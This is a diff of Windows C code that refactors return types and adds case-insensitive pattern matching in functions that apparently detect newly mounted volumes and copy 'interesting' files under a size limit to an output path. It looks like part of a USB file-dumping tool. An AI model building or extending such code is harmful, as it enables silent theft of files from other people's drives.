@@ -35,7 +35,7 @@ UCHAR GetLetterOfNewVolume(const DWORD precVal, const DWORD newVal)
 	return 0;
 }
 
-UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG pConf)
+BOOL DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG pConf)
 {
     WIN32_FIND_DATA findData = {0};
     PUCHAR researchPatternPath = NULL,
@@ -47,15 +47,12 @@ UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG
         sizeStrDirectory = 0,
         sizeFilePathToCopy = 0,
         sizeFilePathCopied = 0,
-        ret = 1,
         status = 0;
+    BOOL ret = TRUE;
 
     researchPatternPath = (PUCHAR)malloc(sizeof(UCHAR) * sizeStr);
     if(researchPatternPath == NULL)
-    {
-        ret = 0;
-        return ret;
-    }
+        return FALSE;
 
     ZeroMemory(researchPatternPath, sizeStr);
     strncpy(researchPatternPath, pVol, strlen(pVol));
@@ -69,8 +66,7 @@ UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG
     if(hFind == INVALID_HANDLE_VALUE)
     {
         free(researchPatternPath);
-        ret = 0;
-        return ret;
+        return FALSE;
     }
 
     do
@@ -87,7 +83,7 @@ UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG
 
                 if(filePathToCopy == NULL || filePathCopied == NULL)
                 {
-                    ret = 0;
+                    ret = FALSE;
                     goto clean;
                 }
 
@@ -137,7 +133,7 @@ UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG
                 directoryPath = (PUCHAR)malloc(sizeof(char) * sizeStrDirectory);
                 if(directoryPath == NULL)
                 {
-                    ret = 0;
+                    ret = FALSE;
                     goto clean;
                 }
 
@@ -163,20 +159,40 @@ UCHAR DumpAndSearchInteresstingFiles(const PUCHAR pVol, const DWORD lvl, PCONFIG
 
     free(researchPatternPath);
     FindClose(hFind);
+
     return ret;
 }
 
-UCHAR isAnInteresstingFile(const PUCHAR file, const unsigned long long fileSize, PCONFIG pConf)
+BOOL isAnInteresstingFile(const PUCHAR file, const unsigned long long fileSize, PCONFIG pConf)
 {
-    DWORD i = 0;
+    PUCHAR str = NULL;
+    DWORD i = 0, sizeStr = strlen(file) + 1;
+    BOOL ret = FALSE;
 
-    for(; i < pConf->nbPattern; ++i)
+    str = (PUCHAR)malloc(sizeof(char) * sizeStr);
+    if(str == NULL)
+        return FALSE;
+
+    ZeroMemory(str, sizeStr);
+
+    for(; i < sizeStr - 1; ++i)
+        str[i] = tolower(file[i]);
+
+    for(i = 0; i < pConf->nbPattern; ++i)
     {
-        if(strstr(file, pConf->patterns[i]) != NULL && fileSize <= pConf->max_size)
-            return 1;
+        if(strstr(str, pConf->patterns[i]) != NULL && fileSize <= pConf->max_size)
+        {
+            ret = TRUE;
+            goto clean;
+        }
     }
 
-    return 0;
+    clean:
+
+    if(str != NULL)
+        free(str);
+
+    return ret;
 }
 
 VOID initUsbStuff(const char* outpath)
